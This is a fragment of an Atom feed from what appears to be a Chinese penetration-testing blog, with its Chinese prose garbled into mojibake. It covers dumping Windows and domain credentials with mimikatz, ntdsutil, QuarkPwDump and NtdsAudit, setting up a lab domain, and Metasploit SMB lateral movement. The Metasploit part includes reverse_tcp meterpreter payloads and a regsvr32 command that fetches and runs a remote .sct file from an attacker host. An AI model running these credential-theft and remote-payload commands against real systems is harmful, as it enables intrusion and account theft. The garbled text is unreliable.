class="line">æˆ–è€…ä»»åŠ¡ç®¡ç†å™¨æ‰¾åˆ°lsass.exeè¿›ç¨‹å³é”®åˆ›å»ºè½¬å‚¨æ–‡ä»¶</span><br></pre></td></tr></table></figure></p><p>æœ¬åœ°ä¸»æœºï¼šmimikatz</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">a.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span> <span class="title">full</span></span></span><br></pre></td></tr></table></figure><ul><li>ntds.dit çš„å¯¼å‡º</li></ul><p>ntdsutil win2008å¼€å§‹DCä¸­è‡ªå¸¦çš„å·¥å…·<br>äº¤äº’å¼<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line">//copy å®Œä¹‹åå†æ‰§è¡Œ</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure></p><p>éäº¤äº’<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "activate instance ntds" create quit quit</span><br><span class="line">ntdsutil snapshot "mount &#123;GUID&#125;" quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit</span><br></pre></td></tr></table></figure></p><ul><li>QuarkPwDumpåˆ†æ <a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a></li></ul><p>åœ¨çº¿æå–ï¼ˆç›´æ¥åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼Œå®æˆ˜ä¸­ä¸é€‰æ‹©æ­¤æ–¹å¼ã€‚ï¼‰<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure></p><p>ç¦»çº¿æå– éœ€è¦ä¸¤ä¸ªæ–‡ä»¶ ntds.dit å’Œ system.hive ï¼Œ å…¶ä¸­system.hiveå¯é€šè¿‡reg save hklm\system system.hiveè·å–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt</span><br></pre></td></tr></table></figure><ul><li>WINDOWS SERVER 2008-2016<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ntdsutil</span><br><span class="line">ntdsutil: activate instance ntds</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:\audit</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure></li></ul><p>è§£å‡ºntdsçš„hash</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><p>  NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe" target="_blank" rel="noopener">ä¸‹è½½åœ°å€</a></p><p>NtdsAuditéœ€è¦<code>ntds.dit</code> Active Directoryæ•°æ®åº“ï¼Œ<code>SYSTEM</code> å¦‚æœè½¬å‚¨å¯†ç å“ˆå¸Œï¼Œåˆ™éœ€è¦æ³¨å†Œè¡¨é…ç½®å•å…ƒã€‚è¿™äº›æ–‡ä»¶ç”±åŸŸæ§åˆ¶å™¨é”å®šï¼Œå› æ­¤æ— æ³•ç®€å•åœ°å¤åˆ¶å’Œç²˜è´´ã€‚ä»åŸŸæ§åˆ¶å™¨è·å–è¿™äº›æ–‡ä»¶çš„æ¨èæ–¹æ³•æ˜¯ä½¿ç”¨å†…ç½®<code>ntdsutil</code>å®ç”¨ç¨‹åºã€‚</p><ul><li><p>ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆ<code>cmd.exe</code>ï¼‰ã€‚è¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¯·å•å‡»â€œå¯åŠ¨â€ã€‚åœ¨â€œå¼€å§‹æœç´¢â€ä¸­ï¼Œé”®å…¥å‘½ä»¤æç¤ºç¬¦ã€‚åœ¨â€œå¼€å§‹â€èœå•çš„é¡¶éƒ¨ï¼Œå³é”®å•å‡»â€œå‘½ä»¤æç¤ºç¬¦â€ï¼Œç„¶åå•å‡»â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ã€‚å¦‚æœå‡ºç°â€œç”¨æˆ·å¸æˆ·æ§åˆ¶â€å¯¹è¯æ¡†ï¼Œè¯·è¾“å…¥ç›¸åº”çš„å‡­æ®ï¼ˆå¦‚æœå·²è¯·æ±‚ï¼‰å¹¶ç¡®è®¤å…¶æ˜¾ç¤ºçš„æ“ä½œæ˜¯æ‚¨æ‰€éœ€çš„æ“ä½œï¼Œç„¶åå•å‡»â€œç»§ç»­â€ã€‚</p></li><li><p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰ENTERé”®ï¼š</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br></pre></td></tr></table></figure><ul><li>åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰Enterï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">activate instance ntds</span><br></pre></td></tr></table></figure><ul><li>åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰Enterï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifm</span><br></pre></td></tr></table></figure><ul><li>åœ¨ifmæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰Enterï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br></pre></td></tr></table></figure><p> <code>&lt;Drive&gt;:\&lt;Folder&gt;</code> æ˜¯è¦åˆ›å»ºçš„æ–‡ä»¶çš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚</p><p>ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ï¼Œè¾“å‡º<code>pwdump.txt</code>åŒ…å«å¯†ç å“ˆå¸Œå€¼çš„æ–‡ä»¶ï¼Œå¹¶è¾“å‡º<code>users.csv</code>åŒ…å«æ¯ä¸ªç”¨æˆ·å¸æˆ·è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv</span><br></pre></td></tr></table></figure><h2 id="Linux-æ˜æ–‡å¯†ç çš„è·å–"><a href="#Linux-æ˜æ–‡å¯†ç çš„è·å–" class="headerlink" title="Linux æ˜æ–‡å¯†ç çš„è·å–"></a>Linux æ˜æ–‡å¯†ç çš„è·å–</h2><p>mimipenguin</p><p>git clone <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>æ”¯æŒçš„æ“ä½œç³»ç»Ÿ</p><table><thead><tr><th>os</th><th>service</th><th>supported</th></tr></thead><tbody><tr><td>Ubuntu Desktop 12.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Ubuntu Desktop 16.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Fedora Workstation 25 (x86_64)</td><td>gnome-keyring-daemon (3.20.0)</td><td>Y</td></tr><tr><td>Fedora Workstation 27 (x86_64)</td><td>gnome-keyring-daemon (3.20.1)</td><td>Y</td></tr><tr><td>Kali-rolling x64</td><td>gnome-keyring-daemon (3.28.0.2)</td><td>Y</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;æŠ“å–-Windows-ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ·-hash-çš„å¤šç§å§¿åŠ¿&quot;&gt;&lt;a href=&quot;#æŠ“å–-Windows-ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ·-hash-çš„å¤šç§å§¿åŠ¿&quot; class=&quot;headerlink&quot; title=&quot;æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿&quot;&gt;&lt;/a&gt;æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Ntds.ditæ˜¯ä¸»è¦çš„ADæ•°æ®åº“ï¼ŒåŒ…æ‹¬æœ‰å…³åŸŸç”¨æˆ·ï¼Œç»„å’Œç»„æˆå‘˜èº«ä»½çš„ä¿¡æ¯ã€‚å®ƒè¿˜åŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ã€‚ä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚ç¬¬äºŒä¸ªåŠ å¯†æ­¥éª¤æ˜¯ä¸ºäº†æ‰§è¡Œå¯†ç è½¬å‚¨ä»¥è¿›è¡Œå®¡è®¡ï¼Œéœ€è¦ä¸¤ä¸ªæ–‡ä»¶çš„å‰¯æœ¬ã€‚
    
    </summary>
    
      <category term="å†…ç½‘" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="åŸŸ" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>windows linux åº”æ€¥å“åº”æµç¨‹åŠå®æˆ˜æ¼”ç»ƒ</title>
    <link href="https://yaalonsong.github.io/2018/10/17/windows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html"/>
    <id>https://yaalonsong.github.io/2018/10/17/windows linux åº”æ€¥å“åº”.html</id>
    <published>2018-10-16T16:40:20.799Z</published>
    <updated>2018-10-16T16:52:24.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸é˜²èŒƒæªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›æˆ–å‡å°‘ç»æµæŸå¤±ã€‚  </p></blockquote><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/odo2Fjtklj-ibStAsyUjHw" target="_blank" rel="noopener">windows åº”æ€¥æµç¨‹åŠå®æˆ˜æ¼”ç»ƒ</a></p><p><a href="https://mp.weixin.qq.com/s/mG0O8Pr8kFF195JLc-XD3A" target="_blank" rel="noopener">Linux åº”æ€¥å“åº”æµç¨‹åŠå®æˆ˜æ¼”ç»ƒ</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸é˜²èŒƒæªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›æˆ–å‡å°‘ç»æµæŸå¤±ã€‚  &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="åº”æ€¥å“åº”" scheme="https://yaalonsong.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="åº”æ€¥å“åº”" scheme="https://yaalonsong.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>æ­å»ºåŸŸç¯å¢ƒ</title>
    <link href="https://yaalonsong.github.io/2018/10/16/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
    <id>https://yaalonsong.github.io/2018/10/16/åŸŸç¯å¢ƒæ­å»º.html</id>
    <published>2018-10-16T15:34:38.000Z</published>
    <updated>2018-10-16T15:48:13.449Z</updated>
    
    <content type="html"><![CDATA[<p><strong>åŸŸç¯å¢ƒæ­å»º å‡†å¤‡ï¼š DC: Windows 2008 server R2 DM: Windows 2003 server SP2</strong></p><p><strong>Windows 2008 server R2 (åŸŸæ§)</strong></p><a id="more"></a><p>1ã€ä¿®æ”¹è®¡ç®—æœºåï¼š å¯ä»¥æ”¹æˆDCæˆ–è€…å…¶ä»–ä»€ä¹ˆçœ‹ç€é¡ºçœ¼çš„åå­—ï¼Œé»˜è®¤ä¹Ÿè¡Œï¼Œå°±æ˜¯æ­å»ºå¥½åŸŸä»¥åå†æ”¹å¯èƒ½ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼›</p><p><img src="/uploads/y1.png" alt="imgl"></p><p><img src="/uploads/y2.png" alt="imgl"></p><p>2ã€é…ç½®å›ºå®šip: æˆ‘è™šæ‹Ÿæœºä½¿ç”¨çš„æ¡¥æ¥æ–¹å¼ï¼Œå¹¶ä¸”è·¯ç”±å™¨æ˜¯192.168.3.1ï¼Œæ‰€ä»¥åœ¨è¿™å¦‚æ­¤è®¾ç½®ï¼Œæ­¤å¤„çš„DNSå¡«å†™æœ¬æœºå³ï¼Œ127.0.0.1ï¼›</p><p><img src="/uploads/y3.png" alt="imgl"></p><p>3ã€æœåŠ¡å™¨ç®¡ç†å™¨â€”è§’è‰²ï¼šå®‰è£…Active Directory åŸŸæœåŠ¡å¹¶ä¸”ä¼šåŒæ—¶è¦æ±‚å®‰è£…DNSæœåŠ¡å™¨ï¼›</p><p><img src="/uploads/y4.png" alt="imgl"></p><p>4ã€é…ç½®åŸŸæœåŠ¡:æ‰“å¼€æœåŠ¡å™¨ç®¡ç†å™¨æˆ–è€…åœ¨è¿è¡Œæ¡†ä¸‹è¾“å…¥ dcpromoç›´æ¥è¿›è¡Œé…ç½®ï¼Œé€‰æ‹©æ–°å»ºï¼Œ</p><p>Psï¼šè¿™é‡Œå¯èƒ½ä¼šå› ä¸ºæœ¬åœ°administratorçš„å¯†ç è§„åˆ™ä¸åˆè¦æ±‚ï¼Œå¯¼è‡´å®‰è£…å¤±è´¥ï¼Œæ”¹ä¸€ä¸ªå¼ºå¯†ç ï¼›</p><p><img src="/uploads/y5.png" alt="imgl"></p><p>5ã€è®¾ç½®æ—æ ¹åŸŸï¼š æ—å°±æ˜¯åœ¨å¤šåŸŸæƒ…å†µä¸‹å½¢æˆçš„æ£®æ—,æ ¹è¡¨ç¤ºåŸºç¡€,å…¶ä»–åœ¨æ­¤æ ¹éƒ¨è¡ç”Ÿ å…·ä½“è§ï¼š<a href="http://angerfire.blog.51cto.com/198455/144123/" target="_blank" rel="noopener">http://angerfire.blog.51cto.com/198455/144123/ </a></p><p>6ã€åŸŸæ•°æ®å­˜æ”¾çš„åœ°å€ï¼šé»˜è®¤å³å¯ã€‚</p><p><strong>DM: Windows 2003 server SP2</strong></p><p>1ã€å¦‚æœæ–°å®‰è£…çš„è™šæ‹Ÿæœºå®‰è£…æ—¶ä¼šæœ‰é€‰æ‹©é¡¹æ˜¯åŠ å…¥åŸŸè¿˜æ˜¯ç»„ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©åŠ å…¥åŸŸï¼Œä¼šè®©ç™»å½•å½“å‰åŸŸçš„è´¦å·å¯†ç å³â€œDomaim\administratorâ€ï¼ˆå¿…é¡»æ˜¯åŸŸè´¦å·ä¸æ˜¯administratorï¼‰å’Œå¯¹åº”å¯†ç ï¼›å·²æœ‰çš„Windows2003åŠ å…¥åŸŸï¼Œé¦–å…ˆæ›´æ”¹ç»„ä¸ºåŸŸé€‰æ‹©æ­£ç¡®çš„domainå’Œdomainè´¦å·å¯†ç å³å¯ã€‚</p><p>2ã€å®‰è£…æˆåŠŸåé…ç½®é™æ€IPï¼ŒDNSå¤„å¡«å†™DCçš„IPï¼›</p><p><img src="/uploads/y6.png" alt="imgl"></p><p>3ã€åœ¨2003ä¸Šæ‰§è¡Œnet timeæ˜¾ç¤ºå¦‚å›¾ï¼Œè¯´æ˜å·²ç»åŠ å…¥åŸŸï¼Œå¹¶ä¸”åœ¨Windows2008ä¸Šçš„domain.comåŸŸï¼Œæ§åˆ¶å™¨ä¸Šå¯ä»¥çœ‹åˆ°03çš„æœºå™¨ï¼›</p><p><img src="/uploads/y7.png" alt="imgl"></p><p><img src="/uploads/y8.png" alt="imgl"></p><p><strong>åŸŸå·²ç»æ­å»ºå®Œæˆï¼Œä¸»åŸŸæ§ä¼šç”Ÿæˆä¸€ä¸ª krbtgtè´¦å·ï¼Œä»–æ˜¯Windowsæ´»åŠ¨ç›®å½•ä¸­ä½¿ç”¨çš„å®¢æˆ·/æœåŠ¡å™¨è®¤è¯åè®®ï¼Œä¸ºé€šä¿¡åŒæ–¹æä¾›åŒå‘èº«ä»½è®¤è¯ã€‚</strong><br><img src="/uploads/y9.png" alt="imgl"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;åŸŸç¯å¢ƒæ­å»º å‡†å¤‡ï¼š DC: Windows 2008 server R2 DM: Windows 2003 server SP2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Windows 2008 server R2 (åŸŸæ§)&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å†…ç½‘" scheme="https://yaalonsong.github.io/categories/intranet/"/>
    
    
      <category term="å†…ç½‘" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="åŸŸ" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>é€šè¿‡MSFä½¿ç”¨SMBç«¯å£è¿œç¨‹è¿æ¥ç›®æ ‡çš„æŠ€å·§</title>
    <link href="https://yaalonsong.github.io/2018/10/16/msf%20smb.html"/>
    <id>https://yaalonsong.github.io/2018/10/16/msf smb.html</id>
    <published>2018-10-16T14:55:36.000Z</published>
    <updated>2019-02-28T13:06:48.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>å†…ç½‘æ¸—é€ä¸­è·å¾—ç®¡ç†å‘˜ç”¨æˆ·åå¯†ç ä¹‹åï¼Œé€šè¿‡SMBç«¯å£445æ¥ä¸ç›®æ ‡æœºå™¨çš„è®¾å¤‡å»ºç«‹è¿æ¥çš„åæ¸—é€æŠ€å·§ã€‚</p></blockquote><a id="more"></a><h3 id="exploit-windows-smb-psexec"><a href="#exploit-windows-smb-psexec" class="headerlink" title="exploit/windows/smb/psexec"></a>exploit/windows/smb/psexec</h3><p><code>msf &gt; use exploit/windows/smb/psexec</code><br><code>msf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec) &gt; set LPORT 4444</code><br><code>msf exploit(windows/smb/psexec) &gt; exploit</code></p><blockquote><p>æ‰§è¡Œåæœ‰ä¸€ä¸ªsessionå›è¿<br>ç»å®éªŒè¡¨æ˜ï¼Œä½¿ç”¨æœ¬åœ°è´¦æˆ·å³ä½¿æ˜¯ç®¡ç†å‘˜æƒé™ä¹Ÿä¸èƒ½ä½¿ç”¨æ­¤æ–¹æ³•å¾—åˆ°ä¸€ä¸ª meterpreter ï¼Œåªèƒ½ä½¿ç”¨ administrator çš„ç”¨æˆ·åå¯†ç æ‰èƒ½å›æ¥ä¸€ä¸ª session ï¼›<br>å½“åœ¨åŸŸç¯å¢ƒä½¿ç”¨æ—¶ï¼Œsmbuser ä¸æ˜¯å†™æˆdomain/administrator ï¼ˆè¿™æ ·çš„ç”¨æˆ·åæ˜¯Exploit failed æ‰§è¡Œä¸æˆåŠŸçš„ï¼‰è€Œæ˜¯å†™æˆ administrator ï¼Œå¹¶ä¸”åªè¦æ˜¯åŸŸç®¡ç†å‘˜éƒ½èƒ½æ‰§è¡ŒæˆåŠŸå¹¶åå¼¹ä¸€ä¸ª meterpreter çš„ session ã€‚</p></blockquote><h3 id="exploit-windows-smb-psexec-psh"><a href="#exploit-windows-smb-psexec-psh" class="headerlink" title="exploit/windows/smb/psexec_psh"></a>exploit/windows/smb/psexec_psh</h3><p><code>msf &gt; use exploit/windows/smb/psexec_psh</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lport 4444</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; exploit</code> </p><h3 id="exploit-multi-script-web-delivery"><a href="#exploit-multi-script-web-delivery" class="headerlink" title="exploit/multi/script/web_delivery"></a>exploit/multi/script/web_delivery</h3><p>ä½¿ç”¨exploit/multi/script/web_delivery ç”Ÿæˆæ¶æ„dllä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; show targets </span><br><span class="line">Exploit targets:</span><br><span class="line">   Id  Name</span><br><span class="line">---</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">   3   Regsvr32</span><br><span class="line">   4   PSH (Binary)</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set target 3</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set lport 4444</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.2.145:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/s7sa27EEtl</span><br><span class="line">[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="auxiliary-admin-smb-psexec-command"><a href="#auxiliary-admin-smb-psexec-command" class="headerlink" title="auxiliary/admin/smb/psexec_command"></a>auxiliary/admin/smb/psexec_command</h3><p>ä½¿ç”¨ auxiliary/admin/smb/psexec_command åœ¨è¿œç¨‹ç›®æ ‡ä¸Šæ‰§è¡Œå‘½ä»¤ç§æ¶æ„ dll å›è¿ meterpreter ï¼›<br><code>msf &gt; use auxiliary/admin/smb/psexec_command</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; exploit</code></p><p>ç»å®éªŒè¡¨æ˜ï¼Œå½“ç›®æ ‡æœºå™¨æœ‰æ€æ¯’è½¯ä»¶çš„æ—¶å€™ï¼Œä¼šæ‹¦æˆªå…¶ä»æœåŠ¡å™¨ä¸Šä¸‹è½½æ¶æ„ dll æ–‡ä»¶ s7sa27EEtl.sct ï¼ˆæµ‹è¯•æœºä¸ºèµ›é—¨é“å…‹æœªæˆæƒç‰ˆï¼‰ï¼Œæ¯•ç«Ÿ msf çš„æ¶æ„dll ç‰¹å¾ç å·²ç»è¢«æ€æ¯’å¼•æ“æ”¶å½•ï¼Œå¦‚æœç¡®å®šç›®æ ‡æœºå…¶æ²¡æœ‰æ€è½¯ä¾¿å¯ä½¿ç”¨ã€‚</p><h3 id="auxiliary-scanner-smb-impacket-wmiexec"><a href="#auxiliary-scanner-smb-impacket-wmiexec" class="headerlink" title="auxiliary/scanner/smb/impacket/wmiexec"></a>auxiliary/scanner/smb/impacket/wmiexec</h3><p><code>msf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexec</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /all</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit</code> </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;blockquote&gt;
